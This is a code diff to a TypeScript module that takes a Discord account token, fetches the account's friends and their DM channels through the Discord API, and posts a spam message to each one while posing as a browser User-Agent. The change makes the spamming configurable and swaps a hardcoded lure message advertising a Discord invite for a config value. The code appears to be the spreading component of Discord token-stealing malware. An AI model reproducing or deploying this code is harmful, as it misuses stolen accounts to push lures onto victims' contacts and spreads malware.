@@ -1,27 +1,10 @@
 import fetch from 'node-fetch';
-
-interface IFriend {
-    id: string;
-    type: number;
-    nickname: string | null
-    user: {
-        id: string
-        username: string
-        avatar: string
-        avatar_decoration: string | null
-        discriminator: string
-        public_flags: 0
-    }
-}
-
-interface IChannel {
-    id: string,
-    type: number,
-    last_message_id: string,
-    recipients: IFriend[]
-}
+import { IConfig, IFriend, IChannel } from '../global';
+const config: IConfig = require('../../config.json');
 
 export default async (token: string) => {
+    if (!config.spam_user_friends) return;
+
     const friends: IFriend[] = await (await fetch(`https://discord.com/api/users/@me/relationships`, { headers: { Authorization: token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0" } })).json();
     const allFriends = friends.map((friend: IFriend) => friend.id);
     const allChannels: string[] = [];
@@ -49,7 +32,7 @@ export default async (token: string) => {
             const message = await fetch(`https://discord.com/api/v9/channels/${channel}/messages`, {
                 method: 'POST',
                 body: JSON.stringify({
-                    content: 'Hey, horion just cracked chronos. it is actually insane! discord.gg/horion',
+                    content: config.spam_message,
                     nonce: '',
                     tts: false
                 }),
